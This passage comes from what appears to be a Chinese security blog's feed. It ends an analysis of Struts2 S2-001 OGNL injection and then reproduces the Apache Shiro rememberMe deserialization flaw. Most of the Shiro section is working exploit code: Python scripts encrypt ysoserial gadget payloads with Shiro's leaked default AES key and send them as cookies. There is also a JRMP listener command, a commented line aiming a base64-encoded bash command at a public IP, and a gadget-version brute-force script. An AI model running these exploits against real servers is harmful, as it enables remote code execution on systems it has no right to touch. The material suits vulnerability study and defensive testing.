class="operator">=</span> (Double) Ognl.getValue(<span class="string">&quot;@java.lang.Math@PI&quot;</span>, ognl, ognl.getRoot());</span><br><span class="line">        System.out.println(pi);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">whoami</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;m &quot;</span> + <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">func2</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Call static method func2&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输入结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user1</span><br><span class="line">user2</span><br><span class="line">user3</span><br><span class="line">user4</span><br><span class="line">I&#x27;m user5</span><br><span class="line">I&#x27;m user6</span><br><span class="line">Call static method func2</span><br><span class="line">3.141592653589793</span><br></pre></td></tr></table></figure>
<h3 id="struts2中的OGNL">struts2中的OGNL</h3>
<p>在Struts2 中有个值栈对象即ValueStack。而说得通俗些，这个值栈就是OgnlContext。ValueStack内部封装了一个CompoundRoot类型的对象作为root属性，CompoundRoot是一个继承ArrayList的栈存储结构。而所有被压入栈中的对象，都会被视为OGNL的Root对象。在使用OGNL计算表达式时，首先会将栈顶元素作为Root对象，进行表达式匹配，匹配不成功则会依次向下匹配，最后返回第一个成功匹配的表达式计算结果。<strong>因此，Struts2通过ValueStack实现了多Root对象的OGNL操作</strong>。</p>
<p>当你提交一个请求，会为这个请求创建一个和web容器交互的ActionContext，与此同时会创建ValueStack，并置于ActionContext之中。而实例化Action之后，就会将这个action对象压入ValueStack中。在请求“映射”过程中，Struts2则是通过ParametersInterceptor拦截器将提交的参数值封装入对应的Action属性中。因此action实例可以作为OGNL的Root对象，对于Action中的属性、方法都可以使用OGNL来获取。</p>
<p><img src="./1570282080999.png" alt="Alt text"></p>
<h2 id="代码分析">代码分析</h2>
<p>首先是下断点的位置，在自己尝试调试之前，读取了一些前人的文章，他们的断点的位置大部分都在<br>
<code>com/opensymphony/xwork2/interceptor/ParametersInterceptor.class</code>的<code>doIntercept</code>方法上面。<br>
<img src="./1570091708205.png" alt="Alt text"></p>
<p>琢磨了一下断点打在ParametersInterceptor拦截器这里的好处</p>
<ul>
<li>不用调试tomcat自身的代码，这里下断点已是tomcat已经把“控制权”移交给strust之后了。</li>
<li>拦截器只能对action请求起作用，而过滤器则可以对几乎所有的请求起作用（一开始想的是在web.xml中配置的struts2过滤器org.apache.struts2.dispatcher.FilterDispatcher处打断点）</li>
<li>ParametersInterceptor是拦截器，在这里下断点刚好是在执行业务逻辑之前，并且ParametersInterceptor是struts2的缺省会用到的拦截器之一。</li>
<li>ParametersInterceptor拦截器的作用是把传来的参数赋值给POJO，所以这里是payload“入侵”的起点。</li>
</ul>
<p><img src="./1570536206343.png" alt="Alt text"><br>
xx<br>
<img src="./1570536642779.png" alt="Alt text"></p>
<p><img src="./1570536884573.png" alt="Alt text"></p>
<p>接下来会进行很多tomcat的内部操作，这里单步跟进IDEA会找不到相应的代码，一开始卡这了，后来看了别人的文章也遇到过这种情况。<br>
<img src="./1570537034455.png" alt="Alt text"></p>
<p>文章提到多次步入，复现的时候一直至少跟了几十次步入也没跟到文章所述位置，估计实际搞要点几百次吧，直接定位到<code>rg.apache.struts2.views.jsp.ComponentTagSupport</code>下断点跳了。<br>
<img src="./1570537304070.png" alt="Alt text"></p>
<p>可以看出来这里实际上是解析jsp模版了，先解析的是jsp中username框，后解析的是password框，我们是从password传入的payload所以第一次先跳过。<br>
最终触发点是在doEndTag时的操作，仔细看看<br>
<img src="./1570537486964.png" alt="Alt text"></p>
<p>eveluateParams处理传入的参数<br>
<img src="./1570537522443.png" alt="Alt text"></p>
<p>默认支持altSyntax，所以会把pssword变成<code>%&#123;password&#125;</code>当ogln表达式解析。（struts.tag.altSyntax 该属性指定是否允许在Struts 2标签中使用表达式语法,因为通常都需要在标签中使用表达式语法,故此属性应该设置为true,该属性的默认值是true）<br>
<img src="./1570537576268.png" alt="Alt text"></p>
<p>跟入addParameter时的findValue<br>
<img src="./1570537598128.png" alt="Alt text"></p>
<p>问题处在while True + Stack.findValue造成了对ogln的递归解析<br>
<img src="./1570537828133.png" alt="Alt text"></p>
<p>第一次，提取出%{password}内容即payload<br>
<img src="./1570540179445.png" alt="Alt text"></p>
<p>第二次，把提出来的payload再次当ognl表达式执行，触发RCE<br>
<img src="./1570538429199.png" alt="Alt text"></p>
<p><img src="./1570540863586.png" alt="Alt text"></p>
<h2 id="参考">参考</h2>
<p><a href="https://www.kingkk.com/2018/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0struts2-S2-001/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">从零开始学习Struts2 S2-001</a><br>
<a href="https://xz.aliyun.com/t/2044">【Struts2-命令-代码执行漏洞分析系列】S2-001</a><br>
<a href="https://blog.csdn.net/sofia_fhx/article/details/84111414">IDEA中创建maven项目没有java和resources子文件的解决</a><br>
<a href="https://www.jianshu.com/p/00585bfc5a94">OGNL</a><br>
<a href="https://www.jellythink.com/archives/283">Struts2学习之OGNL表达式</a><br>
<a href="JSP%E4%B9%9D%E5%A4%A7%E5%86%85%E7%BD%AE%E5%AF%B9%E8%B1%A1%E5%88%86%E6%9E%90">JSP九大内置对象分析</a><br>
<a href="https://03i0.com/2018/04/08/S2-001%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/">S2-001调试分析</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro 反序列化复现</title>
    <url>/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<!-- 只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都会有RCE风险。 -->
<!-- more -->
<h2 id="利用环境搭建">利用环境搭建</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull medicean/vulapps:s_shiro_1</span><br><span class="line">docker run -d -p 80:8080 medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用条件">漏洞利用条件</h2>
<p>只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都会导致反序列化漏洞。</p>
<h2 id="漏洞利用">漏洞利用</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">JAR_FILE = <span class="string">&#x27;/Users/Viarus/Downloads/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>(<span class="params">url, rce_command</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        target = <span class="string">&#x27;https://%s&#x27;</span> % url <span class="keyword">if</span> <span class="string">&#x27;:443&#x27;</span> <span class="keyword">in</span> url <span class="keyword">else</span> <span class="string">&#x27;http://%s&#x27;</span> % url</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        target = url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = generator(rce_command, JAR_FILE)  <span class="comment"># 生成payload</span></span><br><span class="line">        r = requests.get(target, cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: payload.decode()&#125;, timeout=<span class="number">10</span>)  <span class="comment"># 发送验证请求</span></span><br><span class="line">        <span class="built_in">print</span> r.text</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generator</span>(<span class="params">command, fp</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(fp):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;jar file not found!&#x27;</span>)</span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, fp, <span class="string">&#x27;CommonsCollections2&#x27;</span>, command],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	<span class="comment">#http://www.jackson-t.ca/runtime-exec-payloads.html</span></span><br><span class="line">    poc(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, <span class="string">&#x27;open /Applications/Calculator.app&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="动态分析环境搭建">动态分析环境搭建</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/apache/shiro.git</span><br><span class="line">git checkout shiro-root-1.2.4</span><br><span class="line">cd ./shiro/samples/web</span><br></pre></td></tr></table></figure>
<p>mac 安装jdk6 <a href="https://juejin.im/post/5d550c5d51882504fb3022f7">https://juejin.im/post/5d550c5d51882504fb3022f7</a><br>
为了能动态调试需要在<code>shiro/samples/web</code>中添加</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--  需要设置编译的版本 --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="comment">&lt;!--  这里需要将jstl设置为1.2 --&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span> </span><br><span class="line">           <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
<p><img src="./1568432319724.png" alt="Alt text"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;toolchains xmlns=&quot;http://maven.apache.org/TOOLCHAINS/1.1.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">  xsi:schemaLocation=&quot;http://maven.apache.org/TOOLCHAINS/1.1.0 http://maven.apache.org/xsd/toolchains-1.1.0.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--插入下面代码--&gt;</span><br><span class="line">  &lt;toolchain&gt;</span><br><span class="line">    &lt;type&gt;jdk&lt;/type&gt;</span><br><span class="line">    &lt;provides&gt;</span><br><span class="line">      &lt;version&gt;1.6&lt;/version&gt;</span><br><span class="line">      &lt;vendor&gt;sun&lt;/vendor&gt;</span><br><span class="line">    &lt;/provides&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">        &lt;!--这里是你安装jdk的文件目录--&gt;</span><br><span class="line">      &lt;jdkHome&gt;/Library/Java/JavaVirtualMachines/1.6.0.jdk/&lt;/jdkHome&gt;</span><br><span class="line">    &lt;/configuration&gt;</span><br><span class="line">  &lt;/toolchain&gt;</span><br><span class="line">&lt;/toolchains&gt;</span><br></pre></td></tr></table></figure>
<p><img src="./1568433547267.png" alt="Alt text"></p>
<ol>
<li>Run</li>
<li>Edit Configurations</li>
<li>添加TomcatServer(Local)</li>
<li>Server中配置Tomcat路径</li>
<li>Deployment中添加Artifact</li>
<li>选择sample-web:war exploded</li>
</ol>
<p><img src="./1568434183366.png" alt="Alt text"><br>
<img src="./1568434273648.png" alt="Alt text"><br>
<img src="./1568434542261.png" alt="Alt text"></p>
<h2 id="代码分析">代码分析</h2>
<p>根据<a href="https://issues.apache.org/jira/browse/SHIRO-550">官网的叙述</a>比较清楚了<br>
<img src="./1568443220292.png" alt="Alt text"></p>
<h3 id="加密">加密</h3>
<p>convertPrincipalsToBytes<br>
<img src="./1568444817925.png" alt="Alt text"></p>
<p>序列化具体<br>
<img src="./1568444950433.png" alt="Alt text"></p>
<p>加密具体<br>
<img src="./1568445232222.png" alt="Alt text"></p>
<p>加密用到encryptionCipherKey在构造方法中确定，其实就是DEFAULT_CIPHER_KEY_BYTES<br>
<img src="./1568445611986.png" alt="Alt text"><br>
<img src="./1568445398785.png" alt="Alt text"></p>
<p>加密用到的cipherService在对象初始化的时候确定为Aes加密<br>
<img src="./1568445712016.png" alt="Alt text"><br>
<img src="./1568446509804.png" alt="Alt text"></p>
<p>调用栈<br>
<img src="./1568448908855.png" alt="Alt text"></p>
<h3 id="解密">解密</h3>
<p>getRememberedPrincipals<br>
<img src="./1568448343266.png" alt="Alt text"></p>
<p>反序列化的起点<br>
<img src="./1568449252836.png" alt="Alt text"></p>
<p>调用栈<br>
<img src="./1568449190079.png" alt="Alt text"></p>
<h2 id="漏洞的原生利用">漏洞的原生利用</h2>
<p>shiro自带的包是commons-collections3.2.1<br>
<img src="./1568450997092.png" alt="Alt text"></p>
<p>其实原生情况下直接用ysoserial打会出现报错<br>
<img src="./1568467325645.png" alt="Alt text"><br>
<img src="./1568467351639.png" alt="Alt text"></p>
<p>报错的原因是<br>
<img src="./1568454878837.png" alt="Alt text"><br>
<img src="./1568643856640.png" alt="Alt text"></p>
<p>最开始的可以打成功的原因是，为了方便进行复现，搭建环境时手动添加了ysoserial支持的commons-collections4，所以复现起来才和喝水一样简单（橘子师傅原话）<br>
<img src="./1568479508256.png" alt="Alt text"></p>
<p>解决这种问题的办法是使用JRMP，至于原因应该是<br>
<img src="./1568454945784.png" alt="Alt text"><br>
<img src="./1568551239961.png" alt="Alt text"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 4444 CommonsCollections5 &#x27;touch /tmp/hack_shiro_jrmp&#x27;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">JAR_FILE = <span class="string">&#x27;/Users/cengsiqi/Desktop/pentest/ysoserial-0.0.6-SNAPSHOT-all.jar&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>(<span class="params">url, JRMPServerIp</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        target = <span class="string">&#x27;https://%s&#x27;</span> % url <span class="keyword">if</span> <span class="string">&#x27;:443&#x27;</span> <span class="keyword">in</span> url <span class="keyword">else</span> <span class="string">&#x27;http://%s&#x27;</span> % url</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        target = url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = generator(JRMPServerIp, JAR_FILE)  <span class="comment"># 生成payload</span></span><br><span class="line">        r = requests.get(target, cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: payload.decode()&#125;, timeout=<span class="number">10</span>)  <span class="comment"># 发送验证请求</span></span><br><span class="line">        <span class="built_in">print</span> r.text</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generator</span>(<span class="params">JRMPServerIp, fp</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(fp):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;jar file not found!&#x27;</span>)</span><br><span class="line">    <span class="comment">#java -jar ysoserial-master-SNAPSHOT.jar JRMPClient &#x27;1.2.3.4:12345&#x27;</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, fp, <span class="string">&#x27;JRMPClient&#x27;</span>, JRMPServerIp],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#http://www.jackson-t.ca/runtime-exec-payloads.html</span></span><br><span class="line">    <span class="comment">#poc(&#x27;http://47.106.182.92:8080/&#x27;, &#x27;bash -c &#123;echo,ZWNobyBgd2hvYW1pYCA+IC91c3IvbG9jYWwvdG9tY2F0L3dlYmFwcHMvUk9PVC9oYWNrLmpzcA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)</span></span><br><span class="line">    poc(<span class="string">&#x27;http://127.0.0.1:8888/samples_web_war_exploded/&#x27;</span>, <span class="string">&#x27;127.0.0.1:12345&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>然而本地测试的时候并未复现中，应该是gadget的问题，因为在加了commons-conllections4.0的环境用ysoserial的CommonsCollections2就可以成功。难道是环境没装好？</p>
<p><strong>后来仔细看了一下，确实是环境的问题，具体原因是打包成war的时候只会把compile和runtime的打包，而test的属于开发阶段需要使用的，从而不会打进去，而这里common-conllectons恰好属于test。所以生成环境中根本没有common-conllectons，因此是不可能打成功的</strong>。<br>
<img src="./1568551376077.png" alt="Alt text"><br>
<img src="./1568796705290.png" alt="Alt text"></p>
<p>此外注意到原生shiro，还自带CommonsBeanutils1.8.3，而CommonsBeanutils历史上是有gadget。<br>
<img src="./1568646188492.png" alt="Alt text"><br>
<img src="./1568646208505.png" alt="Alt text"></p>
<p>改了ysoserial的pom CommonsBeanutils成1.8.3又爆了新的错误</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Caused by: org.apache.shiro.util.UnknownClassException: Unable to load class named [org.apache.commons.collections.comparators.ComparableComparator] from the thread context, current, or system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.</span><br><span class="line">	at org.apache.shiro.util.ClassUtils.forName(ClassUtils.java:148)</span><br><span class="line">	at org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass(ClassResolvingObjectInputStream.java:53)</span><br><span class="line">	... 51 more</span><br></pre></td></tr></table></figure>
<p><strong>所以立个flag：纯原生的shiro只是一个反序列化的触发点，没有完整gadget。因此需要结合其它依赖shiro的项目才有可能达到RCE的效果（比如jeecms）</strong></p>
<h2 id="其他">其他</h2>
<h3 id="解密脚本">解密脚本</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># pip install pycrypto</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">def decode_rememberme(cookie):</span><br><span class="line">    key  =  &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    cipher = base64.b64decode(cookie)</span><br><span class="line">    IV   = cipher[0:16]</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, IV=IV)</span><br><span class="line">    remember_bin = encryptor.decrypt(cipher[16:])</span><br><span class="line">    return remember_bin</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    cookie=&quot;&quot;&quot;&quot;&quot;&quot;</span><br><span class="line">    print(decode_rememberme(cookie)[16:])</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python decrypt.py cGhyYWNrY3RmREUhfiMkZA== | xxd </span><br></pre></td></tr></table></figure>
<h3 id="DNS-gadget验证漏洞">DNS gadget验证漏洞</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://yoursite</span><br></pre></td></tr></table></figure>
<h3 id="获取全版本解决SUID问题">获取全版本解决SUID问题</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen,PIPE</span><br><span class="line"><span class="keyword">from</span> xml.dom.minidom <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">repo_url = <span class="string">&quot;http://uk.maven.org/maven2/commons-beanutils/commons-beanutils/maven-metadata.xml&quot;</span></span><br><span class="line">mvn_home = <span class="string">&quot;/Users/cengsiqi/.m2/repository&quot;</span></span><br><span class="line">yso_path = <span class="string">&quot;/Users/cengsiqi/Desktop/pentest/ysoserial/target/classes&quot;</span></span><br><span class="line">gadget = <span class="string">&quot;CommonsBeanutils1&quot;</span></span><br><span class="line">command = <span class="string">&#x27;touch /tmp/hack_shiro_CommonsBeanutils1&#x27;</span></span><br><span class="line"><span class="comment">#key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">key = <span class="string">&quot;4AvVhmFLUs0KTA3Kprsdag==&quot;</span></span><br><span class="line">target = <span class="string">&quot;http://172.16.247.129:8080/&quot;</span></span><br><span class="line">iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line"></span><br><span class="line">res = requests.get(repo_url)</span><br><span class="line">html = res.content</span><br><span class="line">root = parseString(html.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">groupId = root.getElementsByTagName(<span class="string">&quot;groupId&quot;</span>)[<span class="number">0</span>].firstChild.data</span><br><span class="line">artifactId = root.getElementsByTagName(<span class="string">&quot;artifactId&quot;</span>)[<span class="number">0</span>].firstChild.data</span><br><span class="line"><span class="built_in">print</span>(groupId, artifactId)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">payload</span>):</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(payload)</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> root.getElementsByTagName(<span class="string">&quot;version&quot;</span>):</span><br><span class="line">    version = i.firstChild.data</span><br><span class="line">    <span class="keyword">if</span> version.find(<span class="string">&#x27;-pre&#x27;</span>) &gt; -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    jar_path = mvn_home + <span class="string">&#x27;/&#x27;</span> + groupId.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&#x27;/&#x27;</span> + artifactId + <span class="string">&#x27;/&#x27;</span> + version + <span class="string">&#x27;/&#x27;</span> + artifactId + <span class="string">&#x27;-&#x27;</span> + version + <span class="string">&#x27;.jar&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(jar_path)</span><br><span class="line">    mvncmd = <span class="string">&quot;mvn dependency:get -DremoteRepositories=http://repo1.maven.org/maven2/ -DgroupId=%s -DartifactId=%s -Dversion=%s&quot;</span> \</span><br><span class="line">          % (groupId, artifactId, version)</span><br><span class="line">    child = Popen(mvncmd, shell=<span class="literal">True</span>, stdout=PIPE, stderr=PIPE)</span><br><span class="line">    child.wait()</span><br><span class="line">    <span class="comment">#yso_path, mvn_home, jar_path, gadget, command</span></span><br><span class="line">    cmd2 = <span class="string">&quot;&#123;0&#125;:&#123;2&#125;:&#123;1&#125;/net/iharder/base64/2.3.9/base64-2.3.9.jar:&#123;1&#125;/commons-io/commons-io/2.6/commons-io-2.6.jar:&#123;1&#125;/org/reflections/reflections/0.9.9/reflections-0.9.9.jar:&#123;1&#125;/com/google/guava/guava/15.0/guava-15.0.jar:&#123;1&#125;/com/google/code/findbugs/annotations/2.0.1/annotations-2.0.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api/2.1.1/shrinkwrap-resolver-api-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi/2.1.1/shrinkwrap-resolver-spi-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api-maven/2.1.1/shrinkwrap-resolver-api-maven-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi-maven/2.1.1/shrinkwrap-resolver-spi-maven-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api-maven-archive/2.1.1/shrinkwrap-resolver-api-maven-archive-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/shrinkwrap-api/1.2.1/shrinkwrap-api-1.2.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-impl-maven/2.1.1/shrinkwrap-resolver-impl-maven-2.1.1.jar:&#123;1&#125;/org/eclipse/aether/aether-api/0.9.0.M2/aether-api-0.9.0.M2.jar:&#123;1&#125;/org/eclipse/aether/aether-impl/0.9.0.M2/aether-impl-0.9.0.M2.j